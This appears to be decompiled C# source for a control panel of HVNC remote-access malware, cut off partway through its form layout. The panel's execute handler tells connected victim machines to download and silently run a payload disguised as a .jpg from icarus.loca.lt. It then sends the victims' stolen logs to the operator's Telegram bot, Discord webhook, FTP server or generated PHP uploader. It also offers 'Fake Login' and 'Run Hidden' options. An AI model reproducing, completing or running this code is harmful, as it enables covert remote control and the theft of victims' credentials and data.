using System;
using System.ComponentModel;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using ShitarusPrivate.HVNC.Properties;

namespace ShitarusPrivate.HVNC
{
    public class TGtoDSC : Form
    {
        private IContainer components;

        private PrimeTheme primeTheme1;

        private TextBox txtHook;

        private TextBox txtID;

        private TextBox txtToken;

        private Label label3;

        private PictureBox pictureBox1;

        private StudioButton studioButton5;

        private Label label5;

        private Label label2;

        private Label label1;

        private GroupBox GroupTG;

        private GroupBox GroupDisc;

        private PrimeButton btnExec;

        private StudioButton btnThelp;

        private StudioButton btnDHelp;

        private Label label4;

        private JCS.ToggleSwitch chkDisc;

        private Label label11;

        private JCS.ToggleSwitch chkTel;

        private Label label6;

        private ComboBox comboBox1;

        private CheckBox checkBox1;

        private Label label7;

        private JCS.ToggleSwitch chkFakeL;

        private Label label9;

        private Label label8;

        private JCS.ToggleSwitch chkFTP;

        private JCS.ToggleSwitch chkPHP;

        private GroupBox GroupPHP;

        private Label label16;

        private TextBox txtPHP;

        private GroupBox GroupFTP;

        private Label label13;

        private Label label12;

        private Label label10;

        private TextBox txtFtpPass;

        private TextBox txtHost;

        private TextBox txtFtpUser;

        private StudioButton studioButton1;

        private StudioButton studioButton2;

        public TGtoDSC()
        {
            InitializeComponent();
        }

        private void studioButton5_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void btnDHelp_Click(object sender, EventArgs e)
        {
            HelpDisc helpDisc = new HelpDisc();
            helpDisc.ShowDialog();
        }

        private void btnThelp_Click(object sender, EventArgs e)
        {
            HelpTel helpTel = new HelpTel();
            helpTel.ShowDialog();
        }

        private void btnExec_Click(object sender, EventArgs e)
        {
            if (chkTel.Checked)
            {
                label3.Text = "Logs will be send to Telegram";
                if (checkBox1.Checked)
                {
                    SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/Icar.jpg*telegram*" + txtToken.Text + "*" + txtID.Text + "*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
                }
                else
                {
                    SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/Icar.jpg*telegram*" + txtToken.Text + "*" + txtID.Text + "*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
                }
            }
            else if (chkDisc.Checked)
            {
                label3.Text = "Logs will be send to Discord";
                if (chkFakeL.Checked)
                {
                    if (checkBox1.Checked)
                    {
                        SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsS.jpg*discord*" + txtHook.Text + "*" + txtHook.Text + "*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
                    }
                    else
                    {
                        SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsS.jpg*discord*" + txtHook.Text + "*" + txtHook.Text + "*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
                    }
                }
                else if (checkBox1.Checked)
                {
                    SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/Icars.jpg*discord*" + txtHook.Text + "*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
                }
                else
                {
                    SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/Icars.jpg*discord*" + txtHook.Text + "*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
                }
            }
            else if (chkPHP.Checked)
            {
                if (checkBox1.Checked)
                {
                    SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsPHP.jpg*PHP*" + txtPHP.Text + "*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
                }
                else
                {
                    SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsPHP.jpg*PHP*" + txtPHP.Text + "*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
                }
            }
            else if (chkFTP.Checked)
            {
                if (checkBox1.Checked)
                {
                    SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsFTP.jpg*FTP*" + txtHost.Text + "*" + txtFtpUser.Text + "*" + txtFtpPass.Text + "*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
                }
                else
                {
                    SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsFTP.jpg*FTP*" + txtHost.Text + "*" + txtFtpUser.Text + "*" + txtFtpPass.Text + "*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
                }
            }
            else if (checkBox1.Checked)
            {
                SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsS.jpg*socket*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsS.jpg*socket*" + comboBox1.SelectedIndex, (TcpClient)base.Tag);
            }
            Close();
        }

        public void SendTCP(object object_0, TcpClient tcpClient_0)
        {
            if (object_0 == null)
            {
                return;
            }
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
            binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
            binaryFormatter.FilterLevel = TypeFilterLevel.Full;
            checked
            {
                lock (tcpClient_0)
                {
                    object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                    ulong num = 0uL;
                    MemoryStream memoryStream = new MemoryStream();
                    binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                    num = (ulong)memoryStream.Position;
                    tcpClient_0.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                    byte[] buffer = memoryStream.GetBuffer();
                    tcpClient_0.GetStream().Write(buffer, 0, (int)num);
                    memoryStream.Close();
                    memoryStream.Dispose();
                }
            }
        }

        private void chkTel_CheckedChanged(object sender, EventArgs e)
        {
            if (chkTel.Checked)
            {
                GroupTG.Enabled = true;
                txtID.Enabled = true;
                txtToken.Enabled = true;
                txtHook.Enabled = false;
                chkDisc.Checked = false;
            }
            else
            {
                GroupTG.Enabled = false;
                txtID.Enabled = false;
                txtToken.Enabled = false;
            }
        }

        private void chkDisc_CheckedChanged(object sender, EventArgs e)
        {
            if (chkDisc.Checked)
            {
                GroupDisc.Enabled = true;
                txtID.Enabled = false;
                txtToken.Enabled = false;
                txtHook.Enabled = true;
                chkTel.Checked = false;
            }
            else
            {
                txtHook.Enabled = false;
                GroupDisc.Enabled = false;
            }
        }

        private void chkSocket_CheckedChanged(object sender, EventArgs e)
        {
            if (chkFakeL.Checked)
            {
                chkTel.Checked = false;
                chkDisc.Checked = false;
            }
        }

        private void TGtoDSC_Load(object sender, EventArgs e)
        {
            if (!string.IsNullOrWhiteSpace(Settings.Default.HOOK))
            {
                txtHook.Text = Settings.Default.HOOK;
            }
            if (!string.IsNullOrWhiteSpace(Settings.Default.TGID) || !string.IsNullOrWhiteSpace(Settings.Default.TGTOKEN))
            {
                txtID.Text = Settings.Default.TGID;
                txtToken.Text = Settings.Default.TGTOKEN;
            }
            if (!string.IsNullOrWhiteSpace(Settings.Default.FTPHOST))
            {
                txtHost.Text = Settings.Default.FTPHOST;
            }
            if (!string.IsNullOrWhiteSpace(Settings.Default.FTPUSER))
            {
                txtFtpUser.Text = Settings.Default.FTPUSER;
            }
            if (!string.IsNullOrWhiteSpace(Settings.Default.FTPPASS))
            {
                txtFtpPass.Text = Settings.Default.FTPPASS;
            }
            if (!string.IsNullOrWhiteSpace(Settings.Default.PHPLINK))
            {
                txtPHP.Text = Settings.Default.PHPLINK;
            }
        }

        private void chkPHP_CheckedChanged(object sender, EventArgs e)
        {
            if (chkPHP.Checked)
            {
                GroupPHP.Enabled = true;
                txtPHP.Enabled = true;
            }
            else
            {
                GroupPHP.Enabled = false;
                txtPHP.Enabled = false;
            }
        }

        private void chkFTP_CheckedChanged(object sender, EventArgs e)
        {
            if (chkFTP.Checked)
            {
                GroupFTP.Enabled = true;
                txtHost.Enabled = true;
                txtFtpUser.Enabled = true;
                txtFtpPass.Enabled = true;
            }
            else
            {
                GroupFTP.Enabled = false;
                txtHost.Enabled = false;
                txtFtpUser.Enabled = false;
                txtFtpPass.Enabled = false;
            }
        }

        private void studioButton1_Click(object sender, EventArgs e)
        {
            string text = Path.Combine(Application.StartupPath, "Up.php");
            File.WriteAllBytes(text, Resources.Upload);
            MessageBox.Show("Your uploader is located:" + text + " .Please upload this to your web hosting and copy the link");
        }

        private void studioButton2_Click(object sender, EventArgs e)
        {
            HelpFTPPHP helpFTPPHP = new HelpFTPPHP();
            helpFTPPHP.ShowDialog();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            Bloom bloom = new Bloom();
            Bloom bloom2 = new Bloom();
            Bloom bloom3 = new Bloom();
            Bloom bloom4 = new Bloom();
            Bloom bloom5 = new Bloom();
            Bloom bloom6 = new Bloom();
            Bloom bloom7 = new Bloom();
            Bloom bloom8 = new Bloom();
            Bloom bloom9 = new Bloom();
            Bloom bloom10 = new Bloom();
            Bloom bloom11 = new Bloom();
            Bloom bloom12 = new Bloom();
            Bloom bloom13 = new Bloom();
            Bloom bloom14 = new Bloom();
            Bloom bloom15 = new Bloom();
            Bloom bloom16 = new Bloom();
            Bloom bloom17 = new Bloom();
            Bloom bloom18 = new Bloom();
            Bloom bloom19 = new Bloom();
            Bloom bloom20 = new Bloom();
            Bloom bloom21 = new Bloom();
            Bloom bloom22 = new Bloom();
            Bloom bloom23 = new Bloom();
            Bloom bloom24 = new Bloom();
            Bloom bloom25 = new Bloom();
            Bloom bloom26 = new Bloom();
            Bloom bloom27 = new Bloom();
            Bloom bloom28 = new Bloom();
            Bloom bloom29 = new Bloom();
            Bloom bloom30 = new Bloom();
            Bloom bloom31 = new Bloom();
            Bloom bloom32 = new Bloom();
            Bloom bloom33 = new Bloom();
            Bloom bloom34 = new Bloom();
            Bloom bloom35 = new Bloom();
            Bloom bloom36 = new Bloom();
            Bloom bloom37 = new Bloom();
            Bloom bloom38 = new Bloom();
            Bloom bloom39 = new Bloom();
            Bloom bloom40 = new Bloom();
            Bloom bloom41 = new Bloom();
            Bloom bloom42 = new Bloom();
            Bloom bloom43 = new Bloom();
            Bloom bloom44 = new Bloom();
            Bloom bloom45 = new Bloom();
            Bloom bloom46 = new Bloom();
            Bloom bloom47 = new Bloom();
            Bloom bloom48 = new Bloom();
            Bloom bloom49 = new Bloom();
            Bloom bloom50 = new Bloom();
            Bloom bloom51 = new Bloom();
            Bloom bloom52 = new Bloom();
            Bloom bloom53 = new Bloom();
            Bloom bloom54 = new Bloom();
            Bloom bloom55 = new Bloom();
            Bloom bloom56 = new Bloom();
            Bloom bloom57 = new Bloom();
            Bloom bloom58 = new Bloom();
            Bloom bloom59 = new Bloom();
            Bloom bloom60 = new Bloom();
            Bloom bloom61 = new Bloom();
            Bloom bloom62 = new Bloom();
            Bloom bloom63 = new Bloom();
            Bloom bloom64 = new Bloom();
            Bloom bloom65 = new Bloom();
            Bloom bloom66 = new Bloom();
            Bloom bloom67 = new Bloom();
            Bloom bloom68 = new Bloom();
            Bloom bloom69 = new Bloom();
            Bloom bloom70 = new Bloom();
            Bloom bloom71 = new Bloom();
            Bloom bloom72 = new Bloom();
            Bloom bloom73 = new Bloom();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.TGtoDSC));
            Bloom bloom74 = new Bloom();
            Bloom bloom75 = new Bloom();
            Bloom bloom76 = new Bloom();
            Bloom bloom77 = new Bloom();
            Bloom bloom78 = new Bloom();
            Bloom bloom79 = new Bloom();
            Bloom bloom80 = new Bloom();
            Bloom bloom81 = new Bloom();
            Bloom bloom82 = new Bloom();
            Bloom bloom83 = new Bloom();
            Bloom bloom84 = new Bloom();
            Bloom bloom85 = new Bloom();
            Bloom bloom86 = new Bloom();
            this.primeTheme1 = new PrimeTheme();
            this.studioButton2 = new StudioButton();
            this.GroupPHP = new System.Windows.Forms.GroupBox();
            this.studioButton1 = new StudioButton();
            this.label16 = new System.Windows.Forms.Label();
            this.txtPHP = new System.Windows.Forms.TextBox();
            this.GroupFTP = new System.Windows.Forms.GroupBox();
            this.label13 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.txtFtpPass = new System.Windows.Forms.TextBox();
            this.txtHost = new System.Windows.Forms.TextBox();
            this.txtFtpUser = new System.Windows.Forms.TextBox();
            this.label9 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.chkFTP = new JCS.ToggleSwitch();
            this.chkPHP = new JCS.ToggleSwitch();
            this.label7 = new System.Windows.Forms.Label();
            this.chkFakeL = new JCS.ToggleSwitch();
            this.label6 = new System.Windows.Forms.Label();
            this.comboBox1 = new System.Windows.Forms.ComboBox();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.label4 = new System.Windows.Forms.Label();
            this.chkDisc = new JCS.ToggleSwitch();
            this.label11 = new System.Windows.Forms.Label();
            this.chkTel = new JCS.ToggleSwitch();
            this.btnThelp = new StudioButton();
            this.btnDHelp = new StudioButton();
            this.btnExec = new PrimeButton();
            this.label3 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.studioButton5 = new StudioButton();
            this.GroupTG = new System.Windows.Forms.GroupBox();
            this.txtToken = new System.Windows.Forms.TextBox();
            this.txtID = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.GroupDisc = new System.Windows.Forms.GroupBox();
            this.txtHook = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.primeTheme1.SuspendLayout();
            this.GroupPHP.SuspendLayout();
            this.GroupFTP.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
            this.GroupTG.SuspendLayout();
            this.GroupDisc.SuspendLayout();
            base.SuspendLayout();
            this.primeTheme1.BackColor = System.Drawing.Color.White;
            this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            bloom.Name = "Sides";
            bloom.Value = System.Drawing.Color.FromArgb(232, 232, 232);
            bloom2.Name = "Gradient1";
            bloom2.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom3.Name = "Gradient2";
            bloom3.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom4.Name = "TextShade";
            bloom4.Value = System.Drawing.Color.White;
            bloom5.Name = "Text";
            bloom5.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom6.Name = "Back";
            bloom6.Value = System.Drawing.Color.White;
            bloom7.Name = "Border1";
            bloom7.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            bloom8.Name = "Border2";
            bloom8.Value = System.Drawing.Color.White;
            bloom9.Name = "Border3";
            bloom9.Value = System.Drawing.Color.White;
            bloom10.Name = "Border4";
            bloom10.Value = System.Drawing.Color.FromArgb(150, 150, 150);
            this.primeTheme1.Colors = new Bloom[10] { bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10 };
            this.primeTheme1.Controls.Add(this.studioButton2);
            this.primeTheme1.Controls.Add(this.GroupPHP);
            this.primeTheme1.Controls.Add(this.GroupFTP);
            this.primeTheme1.Controls.Add(this.label9);
            this.primeTheme1.Controls.Add(this.label8);
            this.primeTheme1.Controls.Add(this.chkFTP);
            this.primeTheme1.Controls.Add(this.chkPHP);
            this.primeTheme1.Controls.Add(this.label7);
            this.primeTheme1.Controls.Add(this.chkFakeL);
            this.primeTheme1.Controls.Add(this.label6);
            this.primeTheme1.Controls.Add(this.comboBox1);
            this.primeTheme1.Controls.Add(this.checkBox1);
            this.primeTheme1.Controls.Add(this.label4);
            this.primeTheme1.Controls.Add(this.chkDisc);
            this.primeTheme1.Controls.Add(this.label11);
            this.primeTheme1.Controls.Add(this.chkTel);
            this.primeTheme1.Controls.Add(this.btnThelp);
            this.primeTheme1.Controls.Add(this.btnDHelp);
            this.primeTheme1.Controls.Add(this.btnExec);
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.pictureBox1);
            this.primeTheme1.Controls.Add(this.studioButton5);
            this.primeTheme1.Controls.Add(this.GroupTG);
            this.primeTheme1.Controls.Add(this.GroupDisc);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8f);
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new System.Drawing.Point(0, 0);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new System.Drawing.Size(838, 652);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 0;
            this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.studioButton2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.studioButton2.BackColor = System.Drawing.Color.Transparent;
            bloom11.Name = "DownGradient1";
            bloom11.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom12.Name = "DownGradient2";
            bloom12.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom13.Name = "NoneGradient1";
            bloom13.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom14.Name = "NoneGradient2";
            bloom14.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom15.Name = "Shine1";
            bloom15.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom16.Name = "Shine2A";
            bloom16.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom17.Name = "Shine2B";
            bloom17.Value = System.Drawing.Color.Transparent;
            bloom18.Name = "Shine3";
            bloom18.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom19.Name = "TextShade";
            bloom19.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom20.Name = "Text";
            bloom20.Value = System.Drawing.Color.White;
            bloom21.Name = "Glow";
            bloom21.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom22.Name = "Border";
            bloom22.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom23.Name = "Corners";
            bloom23.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton2.Colors = new Bloom[13]
            {
                bloom11, bloom12, bloom13, bloom14, bloom15, bloom16, bloom17, bloom18, bloom19, bloom20,
                bloom21, bloom22, bloom23
            };
            this.studioButton2.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton2.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton2.Image = null;
            this.studioButton2.Location = new System.Drawing.Point(259, 568);
            this.studioButton2.Name = "studioButton2";
            this.studioButton2.NoRounding = false;
            this.studioButton2.Size = new System.Drawing.Size(108, 30);
            this.studioButton2.TabIndex = 79;
            this.studioButton2.Text = "PHP/FTP Help";
            this.studioButton2.Transparent = true;
            this.studioButton2.Click += new System.EventHandler(studioButton2_Click);
            this.GroupPHP.Controls.Add(this.studioButton1);
            this.GroupPHP.Controls.Add(this.label16);
            this.GroupPHP.Controls.Add(this.txtPHP);
            this.GroupPHP.Enabled = false;
            this.GroupPHP.Location = new System.Drawing.Point(33, 429);
            this.GroupPHP.Name = "GroupPHP";
            this.GroupPHP.Size = new System.Drawing.Size(775, 102);
            this.GroupPHP.TabIndex = 78;
            this.GroupPHP.TabStop = false;
            this.GroupPHP.Text = "PHP";
            this.studioButton1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.studioButton1.BackColor = System.Drawing.Color.Transparent;
            bloom24.Name = "DownGradient1";
            bloom24.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom25.Name = "DownGradient2";
            bloom25.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom26.Name = "NoneGradient1";
            bloom26.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom27.Name = "NoneGradient2";
            bloom27.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom28.Name = "Shine1";
            bloom28.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom29.Name = "Shine2A";
            bloom29.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom30.Name = "Shine2B";
            bloom30.Value = System.Drawing.Color.Transparent;
            bloom31.Name = "Shine3";
            bloom31.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom32.Name = "TextShade";
            bloom32.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom33.Name = "Text";
            bloom33.Value = System.Drawing.Color.White;
            bloom34.Name = "Glow";
            bloom34.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom35.Name = "Border";
            bloom35.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom36.Name = "Corners";
            bloom36.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton1.Colors = new Bloom[13]
            {
                bloom24, bloom25, bloom26, bloom27, bloom28, bloom29, bloom30, bloom31, bloom32, bloom33,
                bloom34, bloom35, bloom36
            };
            this.studioButton1.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton1.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton1.Image = null;
            this.studioButton1.Location = new System.Drawing.Point(609, 25);
            this.studioButton1.Name = "studioButton1";
            this.studioButton1.NoRounding = false;
            this.studioButton1.Size = new System.Drawing.Size(121, 30);
            this.studioButton1.TabIndex = 63;
            this.studioButton1.Text = "Generate Uploader";
            this.studioButton1.Transparent = true;
            this.studioButton1.Click += new System.EventHandler(studioButton1_Click);
            this.label16.AutoSize = true;
            this.label16.Location = new System.Drawing.Point(45, 42);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(116, 13);
            this.label16.TabIndex = 58;
            this.label16.Text = "PHP Uploader Link:";
            this.txtPHP.Enabled = false;
            this.txtPHP.Location = new System.Drawing.Point(185, 25);
            this.txtPHP.Multiline = true;
            this.txtPHP.Name = "txtPHP";
            this.txtPHP.Size = new System.Drawing.Size(419, 30);
            this.txtPHP.TabIndex = 52;
            this.GroupFTP.Controls.Add(this.label13);
            this.GroupFTP.Controls.Add(this.label12);
            this.GroupFTP.Controls.Add(this.label10);
            this.GroupFTP.Controls.Add(this.txtFtpPass);
            this.GroupFTP.Controls.Add(this.txtHost);
            this.GroupFTP.Controls.Add(this.txtFtpUser);
            this.GroupFTP.Enabled = false;
            this.GroupFTP.Location = new System.Drawing.Point(33, 273);
            this.GroupFTP.Name = "GroupFTP";
            this.GroupFTP.Size = new System.Drawing.Size(775, 152);
            this.GroupFTP.TabIndex = 77;
            this.GroupFTP.TabStop = false;
            this.GroupFTP.Text = "Ftp";
            this.label13.AutoSize = true;
            this.label13.Location = new System.Drawing.Point(117, 119);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(62, 13);
            this.label13.TabIndex = 60;
            this.label13.Text = "FTP Pass:";
            this.label12.AutoSize = true;
            this.label12.Location = new System.Drawing.Point(117, 83);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(62, 13);
            this.label12.TabIndex = 59;
            this.label12.Text = "FTP User:";
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(118, 47);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(61, 13);
            this.label10.TabIndex = 58;
            this.label10.Text = "FTP Host:";
            this.txtFtpPass.Enabled = false;
            this.txtFtpPass.Location = new System.Drawing.Point(203, 102);
            this.txtFtpPass.Multiline = true;
            this.txtFtpPass.Name = "txtFtpPass";
            this.txtFtpPass.Size = new System.Drawing.Size(454, 30);
            this.txtFtpPass.TabIndex = 53;
            this.txtHost.Enabled = false;
            this.txtHost.Location = new System.Drawing.Point(203, 30);
            this.txtHost.Multiline = true;
            this.txtHost.Name = "txtHost";
            this.txtHost.Size = new System.Drawing.Size(454, 30);
            this.txtHost.TabIndex = 52;
            this.txtFtpUser.Enabled = false;
            this.txtFtpUser.Location = new System.Drawing.Point(203, 66);
            this.txtFtpUser.Multiline = true;
            this.txtFtpUser.Name = "txtFtpUser";
            this.txtFtpUser.Size = new System.Drawing.Size(454, 30);
            this.txtFtpUser.TabIndex = 51;
            this.label9.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(414, 611);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(82, 13);
            this.label9.TabIndex = 76;
            this.label9.Text = "FTP Uploader";
            this.label8.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(323, 611);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(29, 13);
            this.label8.TabIndex = 75;
            this.label8.Text = "PHP";
            this.chkFTP.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.chkFTP.BackColor = System.Drawing.Color.Transparent;
            this.chkFTP.Location = new System.Drawing.Point(358, 608);
            this.chkFTP.Name = "chkFTP";
            this.chkFTP.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkFTP.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkFTP.Size = new System.Drawing.Size(50, 19);
            this.chkFTP.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkFTP.TabIndex = 74;
            this.chkFTP.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkFTP_CheckedChanged);
            this.chkPHP.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.chkPHP.BackColor = System.Drawing.Color.Transparent;
            this.chkPHP.Location = new System.Drawing.Point(267, 608);
            this.chkPHP.Name = "chkPHP";
            this.chkPHP.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkPHP.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkPHP.Size = new System.Drawing.Size(50, 19);
            this.chkPHP.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkPHP.TabIndex = 73;
            this.chkPHP.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkPHP_CheckedChanged);
            this.label7.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(558, 611);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(67, 13);
            this.label7.TabIndex = 72;
            this.label7.Text = "Fake Login";
            this.chkFakeL.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.chkFakeL.BackColor = System.Drawing.Color.Transparent;
            this.chkFakeL.Location = new System.Drawing.Point(502, 608);
            this.chkFakeL.Name = "chkFakeL";
            this.chkFakeL.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkFakeL.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkFakeL.Size = new System.Drawing.Size(50, 19);
            this.chkFakeL.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkFakeL.TabIndex = 71;
            this.chkFakeL.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkSocket_CheckedChanged);
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(628, 568);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(41, 13);
            this.label6.TabIndex = 70;
            this.label6.Text = "Path :";
            this.comboBox1.DisplayMember = "3";
            this.comboBox1.FormattingEnabled = true;
            this.comboBox1.Items.AddRange(new object[5] { "Desktop", "Local", "Program Files", "Roaming", "Temp" });
            this.comboBox1.Location = new System.Drawing.Point(678, 560);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new System.Drawing.Size(130, 21);
            this.comboBox1.TabIndex = 69;
            this.comboBox1.Text = "Temp";
            this.checkBox1.AutoSize = true;
            this.checkBox1.Checked = true;
            this.checkBox1.CheckState = System.Windows.Forms.CheckState.Checked;
            this.checkBox1.Location = new System.Drawing.Point(717, 537);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(91, 17);
            this.checkBox1.TabIndex = 68;
            this.checkBox1.Text = "Run Hidden";
            this.checkBox1.UseVisualStyleBackColor = true;
            this.label4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(89, 611);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(50, 13);
            this.label4.TabIndex = 67;
            this.label4.Text = "Discord";
